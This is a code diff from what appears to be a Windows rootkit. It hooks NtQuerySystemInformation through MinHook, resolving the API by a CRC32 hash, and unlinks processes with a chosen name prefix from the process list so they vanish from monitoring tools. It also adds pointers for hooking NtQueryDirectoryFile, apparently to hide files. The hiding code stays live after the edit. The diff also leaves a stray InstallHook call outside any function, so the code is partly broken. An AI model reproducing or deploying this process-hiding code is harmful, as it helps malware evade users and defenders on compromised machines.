@@ -12,37 +12,20 @@
 fnNtQuerySystemInformation originalNtQuery;
 fnNtQuerySystemInformation newNtQuery;
 
-VOID InitHooks() {
+fnNtQueryDirectoryFile originalNtQueryDir;
+fnNtQueryDirectoryFile newNtQueryDir;
 
     
     InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);
 
-}
-
-NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
-    NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
 
-    if (SystemInformationClass == SystemProcessInformation && stat == 0) {
 
-        PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
-        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);
+VOID InitHooks() {
 
-        while (TRUE) {
-
-            if (HasPrefixU(curr->ImageName)) {
-                prev->NextEntryOffset += curr->NextEntryOffset;
-                curr = prev;
-            }
-
-            if (!curr->NextEntryOffset)
-                break;
-
-            prev = curr;
-            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
-        }
-    }
-    return stat;
+    MH_Initialize();
+    InstallHook(NtQuerySystemInformation_CRC32, &originalNtQuery, &hookedNtQuery, &newNtQuery);
+    
 }
 
 
@@ -78,6 +61,37 @@ BOOL UnHook() {
 
     return TRUE;
 }
+
+
+
+NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
+    NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+
+
+    if (SystemInformationClass == SystemProcessInformation && stat == 0) {
+
+        PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);
+
+        while (TRUE) {
+
+            if (HasPrefixU(curr->ImageName)) {
+                prev->NextEntryOffset += curr->NextEntryOffset;
+                curr = prev;
+            }
+
+            if (!curr->NextEntryOffset)
+                break;
+
+            prev = curr;
+            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
+        }
+    }
+    return stat;
+}
+
+
+
 
 
 BOOL HasPrefix(LPCWSTR str)
